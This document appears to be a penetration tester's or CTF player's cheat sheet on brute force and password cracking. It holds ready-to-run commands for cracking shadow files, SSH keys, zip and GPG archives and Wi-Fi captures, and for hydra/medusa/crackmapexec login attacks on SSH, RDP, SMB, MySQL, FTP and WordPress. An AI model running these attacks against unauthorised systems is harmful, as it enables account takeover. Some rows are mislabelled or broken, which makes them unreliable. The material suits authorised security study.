# BruteForce
* [Credentials](#credentials)
* [Files](#files)
* [Services](#services)
* [Web Services](#web-services)
* [Wordlists](#wordlists)
  * [Good Wordlists](#good-wordlists)
  * [Generate wordlist](#good-wordlists)
  * [Merge Wordlists](#good-wordlists)
  * [Password Profiling](#password-profiling)
  * [Password Mutation](#password-mutation)

## Default Credentials
* https://cirt.net/passwords
* https://default-password.info/
* https://datarecovery.com/rd/default-passwords/

## Credentials
| Info | Command |
|:-----|:--------|
| Create clist (user:password) formated | `creds.txt` |
| Create users list | `cat creds.txt \| awk -F ":" '{print $1}' > users.txt` |
| Create password list | `cat creds.txt \| awk -F ":" '{print $2}' > passwords.txt` |

## Cisco Passwords
| Info | Command |
|:-----|:--------|
| Type 5 Password Cracker | https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html |
| Type 7 Password Cracker | https://www.ifm.net.nz/cookbooks/passwordcracker.html |

## Files
| File / Hash        | Description               | Command                                                               |
| -------------------|:-------------------------:|:----------------------------------------------------------------------|
| Group Policy Pref  | gpp-decrypt               | `gpp-decrypt`                                                         |
| Fernet             | Decrypt using key         | https://asecuritysite.com/encryption/ferdecode                        |
| Linux (Shadow File)| Unshadow the file      | `unshadow passwd.txt shadow.txt > unshadowed.txt` |
| Linux (Shadow File)| Crack with John        | `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt` |
| SSH keys           | Extract hash           | `python ssh2john.py id_rsa > id_rsa.hash` |
| SSH keys           | Crack with John        | `john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt` |
| Zip Files          | Fcrackzip              | `fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' $zip.zip` |
| Zip Files          | zip2john (extract hash)| `zip2john $zip.zip > hash.hash` |
| Zip Files          | zip2john (crack john)  | `john --wordlist=/usr/share/wordlists/rockyou.txt tom.hash` |
| GPG Files          | Import Key             | `gpg --import priv.key` |
| GPG Files          | Decrypt File           | `gpg --decrypt CustomerDetails.xlsx.gpg` |
| JWT Tokens | | `./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c` |
| PCAP (WIFI) | Wifi Attack file | `aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt` |

### Zip Plaintext
1. List archive contents (Find known file)`7z l file.zip`
2. List archive contents extended infomation  (Get file CRC) `7z l uploaded-file-3422.zip -slt`
3. Load Python `python3`
4. Import binascii module `import binascii`
5. Read known file`with open('/home/kali/.bash_logout', 'rb') as f:`
6. Set variable (Keep 4 spaces at start)`    data = f.read()`
7. Hit enter to leave blank line `<ENTER>`
8. Enter the data variable `data`
9. Calculate CRC of file check it matches the one found in step 2 `hex(binascii.crc32(data) & 0xFFFFFFFF)`
10. Add known file to a zip file `zip plain.zip bash_logout`
11. -C Encrypted zip file, -c known file, -P unencrypted zip, -p Name of file in unencrypted zip `/opt/bkcrack/bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p bash_logout`
12. -C Encrypted zip file, -k keys found in step 11, -U output archive name, password (pass) `/opt/bkcrack/bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U uploaded-file-3422-pass.zip pass`
13. Unzip archive with the password (pass) `unzip uploaded-file-3422-pass.zip -d unzipped/`

## Services
| Service | Description                             | Command                                                               |
| ------- |:---------------------------------------:|:----------------------------------------------------------------------|
| FTP     | Known user and rockyou password list    | `hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp` |
| HTTP    | hydra http-post request known user      | `hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form "<Login Page>:<Request Body>:<Error Message>" -v -V` |
| HTTP    | hydra http-get request known users      | `hydra -l admin -P /usr/share/wordlists/rockyou.txt -f $ip http-get /svn -V -I` | hydra -l admin -P /usr/share/wordlists/rockyou.txt -f $ip http-get /svn -V -I
| MYSQL   | Known user and rockyou password list    | `hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip mysql`              |
| MYSQL   | Known user and rockyou password list    | `medusa -v 4 -h $ip -M mysql -u root -P /usr/share/wordlists/rockyou.txt -t 40`  |
| MYSQL   | Username list and rockyou password list | `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip mysql`          |
| MYSQL   | Metasploit                              | `use auxiliary/scanner/mysql/mysql_login`                                   |
| ORACLE  | Hyra password attach rockyou            | `hydra -P /usr/share/wordlists/rockyou.txt -t 32 -s 1521 $ip oracle-listener` |
| POP3    | Known user and rockyou password list    | `hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $ip pop3 -V`         |
| RDP     | Known user and rockyou password list    | `hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt rdp://$ip`   |
| RDP     | Known user and rockyou password list    | `ncrack -vv --user $user -P /usr/share/wordlists/rockyou.txt rdp://$ip`     |
| SMB     | Metasploit                              | `hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt $ip smb`     |
| SMB     | Known user and rockyou password list    | `use auxiliary/scanner/smb/smb_login`                                       |
| SMB     | User & password list | `crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success` |
| SMTP    | Known user and rockyou password list    | `hydra -P /usr/share/wordlists/rockyou.txt $ip smtp -V`                     |
| SNMP    | Known user and rockyou password list    | `hydra -P /usr/share/wordlists/rockyou.txt -v $ip snmp`                     |
| SSH     | Enumerate users with metasploit         | `use auxiliary/scanner/ssh/ssh_enumusers`                                   |
| SSH     | Quick Known user and rockyou password list | `hydra $ip -s 22 ssh -l gaara -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -F` |
| SSH     | Known user and rockyou password list    | `hydra $ip -s 22 ssh -l $user -P /usr/share/wordlists/rockyou.txt -V -F`          |
| SSH     | Username list and rockyou password list | `hydra -F -L users.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip ssh`      |
| VNC     | Known user & rockyou password list      | `hydra $ip -P /usr/share/wordlists/rockyou.txt -s 5900 vnc -V`              |

## Web Services
| Description                             | Command                                                               |
|:---------------------------------------:|:----------------------------------------------------------------------|
| set variable for post/hydra - command layout | `export post=<Login Page>:<Request Body>:<Error Message>` | 
| set variable for post/hydra - example | `export post='/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-660&User=^USER^&Password=^PASS^:Login failed!'` |
| create & mutate wordlist (All sites / pages) | `cewl $ip -m 4 -w wordlist.txt; john --wordlist=wordlist.txt --rules --stdout > mutated.txt` | 
| hydra wordlist | `hydra -l root@localhost -P wordlist.txt $ip http-post-form "$post"` |
| hydra mutated | `hydra -l root@localhost -P mutated.txt $ip http-post-form "$post"` |
| hydra rockyou | `hydra -l root@localhost -P/usr/share/wordlists/rockyou.txt $ip http-post-form "$post"`
| Wordpress | `hydra -l admin -P /usr/share/wordlists/rockyou.txt sunset-midnight -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 64` |

## Wordlists
### Good Wordlists
```bash
/usr/share/wordlists/fasttrack.txt
/usr/share/dirb/wordlists/others/best1050.txt
/usr/share/wordlists/rockyou.txt
```
### Generate wordlist
`for i in `seq 1 100`; do echo $i; done | cb`
### Merge Wordlists
`python dymerge.py /usr/share/seclists/Usernames/ -u -o names.txt`

### Password Profiling
| Info | Command |
|:-----|:--------|
| Basic website scrape | `cewl -w wordlist.txt http://$ip` |
| Website scrape minimum 6 characters | `cewl -m 6 -w wordlist.txt http://$ip` |

### Password Mutation
| Info | Command |
|:-----|:--------|
| Basic Mutation with John | `john --wordlist=wordlist.txt --rules --stdout > wordlist-mutated.txt` |
| Create for length of six with list of allowed characters | `crunch 6 6 0123456789ABCDEF -o list.txt` |
| Length of 4 both upper and lowercase | `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt` |
| Create for length of six with list of allowed characters | `crunch 6 6 0123456789ABCDEF -o list.txt` |
| Length of 4 both upper and lowercase | `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt` |
| Generate custom list | `crunch 8 8 -t ,@@^^%%% \| more` |
| John Rule (Capitilize the first letter add 2 digits then a special) | `Az"[0-9][0-9][!?#$%&/()=]"` |

### Password List Generation
```python
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0
```

### Hash Password List

`while read -r passwords_generated.txt; do printf %s "$line" | md5sum | cut -f1 -d' '; done < passwords.lst`